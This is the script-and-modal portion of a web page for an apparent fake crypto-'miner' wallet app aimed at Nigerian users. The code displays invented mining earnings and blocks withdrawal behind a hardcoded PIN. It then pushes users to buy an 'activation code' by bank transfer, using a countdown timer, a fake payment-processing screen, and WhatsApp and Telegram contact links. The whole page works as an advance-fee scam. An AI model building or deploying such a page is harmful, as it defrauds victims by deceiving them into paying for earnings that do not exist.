            const message = `Hey I want to activate my ${minerType.toUpperCase()} MINER with the sum of ${price.toLocaleString()} naira please I need the account details to pay too`;
            window.open(`https://wa.me/8131584240?text=${encodeURIComponent(message)}`, '_blank');
        };

        window.processWithdraw = function() {
            const accNum = document.getElementById('wAccountNumber').value.trim();
            const accName = document.getElementById('wAccountName').value.trim();
            const bank = document.getElementById('wBank').value;
            const amount = document.getElementById('wAmount').value.trim();
            if (!accNum || !accName || !bank || !amount) {
                alert("Please fill all withdrawal details correctly");
                return;
            }
            document.getElementById('withdrawScreen').classList.add('hidden');
            document.getElementById('pinScreen').classList.remove('hidden');
            startBannerRotation('bannerPin');
            pinEntered = "";
            updatePinDisplay();
        };

        function addPinDigit(d) {
            if (pinEntered.length < 4) { pinEntered += d; updatePinDisplay(); }
        }

        function clearPin() {
            pinEntered = "";
            updatePinDisplay();
        }

        function updatePinDisplay() {
            const dots = "●".repeat(pinEntered.length) + "•".repeat(4 - pinEntered.length);
            document.getElementById('pinDisplay').textContent = dots;
        }

        function submitPin() {
            if (pinEntered.length === 4) {
                if (pinEntered === "2670") {
                    document.getElementById('pinScreen').classList.add('hidden');
                    alert("Withdrawal successful! Funds will arrive shortly.\nThank you for using Bank Wallet v26");
                    setTimeout(() => document.getElementById('screen4').classList.remove('hidden'), 800);
                } else {
                    document.getElementById('pinScreen').classList.add('hidden');
                    document.getElementById('activationModal').classList.remove('hidden');
                }
            }
        }

        window.showBuyCodeScreen = function() {
            document.getElementById('activationModal').classList.add('hidden');
            document.getElementById('buyCodeScreen').classList.remove('hidden');
            startBannerRotation('bannerBuyCode');
        };

        window.hideBuyCodeScreen = function() {
            document.getElementById('buyCodeScreen').classList.add('hidden');
        };

        window.proceedTransaction = function() {
            const accNum = document.getElementById('transAccountNumber').value.trim();
            const accName = document.getElementById('transAccountName').value.trim();
            const bank = document.getElementById('transBankName').value.trim();
            if (!accNum || !accName || !bank) {
                alert("Please provide correct account details");
                return;
            }
            transUserName = accName;
            transAccountNum = accNum;
            transBank = bank;
            document.getElementById('buyCodeScreen').classList.add('hidden');
            document.getElementById('transferScreen').classList.remove('hidden');
            document.getElementById('waitingName').textContent = transUserName;
            document.getElementById('waitingNumber').textContent = transAccountNum;
            document.getElementById('waitingBank').textContent = transBank;
            startBannerRotation('bannerTransfer');
            startTimer();
        };

        function startTimer() {
            let seconds = 6 * 60 + 49;
            const timerEl = document.getElementById('timer');
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                seconds--;
                const min = Math.floor(seconds / 60);
                const sec = seconds % 60;
                timerEl.textContent = `${min.toString().padStart(2, '0')} : ${sec.toString().padStart(2, '0')}`;
                if (seconds <= 0) clearInterval(timerInterval);
            }, 1000);
        }

        window.cancelTransfer = function() {
            document.getElementById('transferScreen').classList.add('hidden');
            if (timerInterval) clearInterval(timerInterval);
            document.getElementById('screen4').classList.remove('hidden');
        };

        window.confirmPayment = function() {
            document.getElementById('transferScreen').classList.add('hidden');
            document.getElementById('loadingPaymentScreen').classList.remove('hidden');
            let countdown = 15;
            const countdownEl = document.getElementById('countdown');
            countdownEl.textContent = countdown;
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownEl.textContent = countdown;
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    document.getElementById('loadingPaymentScreen').classList.add('hidden');
                    document.getElementById('pendingName').textContent = transUserName;
                    document.getElementById('pendingAccount').textContent = transAccountNum;
                    document.getElementById('pendingBank').textContent = transBank;
                    document.getElementById('pendingPaymentModal').classList.remove('hidden');
                }
            }, 1000);
        };

        window.returnToTransfer = function() {
            document.getElementById('pendingPaymentModal').classList.add('hidden');
            document.getElementById('transferScreen').classList.remove('hidden');
        };

        // Support functions
        window.openChatUs = function() {
            document.getElementById('chatUsScreen').classList.remove('hidden');
        };

        window.closeChatUs = function() {
            document.getElementById('chatUsScreen').classList.add('hidden');
        };

        window.openTelegramOptions = function() {
            document.getElementById('chatUsScreen').classList.add('hidden');
            document.getElementById('telegramOptionsScreen').classList.remove('hidden');
        };

        window.closeTelegramOptions = function() {
            document.getElementById('telegramOptionsScreen').classList.add('hidden');
        };

        window.copyTelegramUsername = function() {
            navigator.clipboard.writeText('@center686').then(() => {
                const btn = document.querySelector('.copy-btn');
                if (btn) {
                    const original = btn.innerHTML;
                    btn.innerHTML = '✓ COPIED';
                    setTimeout(() => btn.innerHTML = original, 2000);
                }
            });
        };

        window.openTelegramChatDirect = function() {
            window.open('https://t.me/center686', '_blank');
        };

        window.joinWhatsAppGroup = function() {
            window.open('https://chat.whatsapp.com/EkkUNgK0WliLLdzCMlT1Cq', '_blank');
        };

        // Number restriction
        document.addEventListener('input', function(e) {
            if (e.target.type === 'tel' || e.target.type === 'number') {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
            }
        });

        // Insert all modals
        document.body.insertAdjacentHTML('beforeend', `
            <div id="miningModal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-[100]">
                <div class="bg-white text-black rounded-3xl max-w-xs w-full mx-6 p-8">
                    <h3 class="text-2xl font-bold mb-4">Welcome new user</h3>
                    <p class="text-gray-700">Hello dear user your current plan is set on free miner so you can only mine NGN76,000.00 daily are you sure you want to start miner.</p>
                    <div class="mt-8 flex gap-3">
                        <button onclick="hideMiningModal()" class="flex-1 py-4 border border-gray-400 rounded-2xl font-semibold">CANCEL</button>
                        <button onclick="confirmStartMining()" class="flex-1 py-4 bg-[#22c55e] text-black rounded-2xl font-bold">START MINING</button>
                    </div>
                </div>
            </div>
            
            <div id="successModal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-[100]">
                <div class="bg-white text-black rounded-3xl max-w-xs w-full mx-6 p-8">
                    <h3 class="text-2xl font-bold mb-4">Mined successful</h3>
                    <p class="text-gray-700">You have successfully mined NGN76,000.00 to your wallet now you can withdraw</p>
                    <button onclick="closeSuccessModal()" class="mt-8 w-full py-5 bg-[#22c55e] text-black rounded-2xl font-bold">OK</button>
                </div>
            </div>
            
            <div id="activationModal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-[100]">
                <div class="bg-white text-black rounded-3xl max-w-xs w-full mx-6 p-8">
                    <div class="flex justify-center mb-6">
                        <svg width="70" height="70" viewBox="0 0 138 158" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M69 12 L20 38 L20 88 C20 122 42 140 69 148 C96 140 118 122 118 88 L118 38 L69 12 Z" fill="#166534" stroke="#fff" stroke-width="12"/>
                            <g transform="translate(48 58) scale(0.38)">
                                <polygon points="15,45 60,18 105,45" fill="#fff"/>
                                <rect x="20" y="45" width="80" height="52" rx="4" fill="#fff"/>
                            </g>
                        </svg>
                    </div>
                    <h3 class="text-xl font-bold text-center mb-3">Activation Pin</h3>
                    <p class="text-gray-700 text-center leading-relaxed">Invalid activation pin Please purvhase your activation pin from the application to continue the process and start making money daily hope you enjoy our app</p>
                    <p class="text-xs mt-6 text-gray-600 font-medium">NOTE: Your activation pin can not be shared each activation code is designed for a user</p>
                    <button onclick="showBuyCodeScreen()" class="mt-8 w-full py-5 bg-[#22c55e] text-black rounded-2xl font-bold">BUY CODE</button>
                </div>
            </div>
        `);

        function hideMiningModal() { document.getElementById('miningModal').classList.add('hidden'); }
        function closeSuccessModal() { document.getElementById('successModal').classList.add('hidden'); }

        window.onload = startApp;
    </script>
</body>
</html>
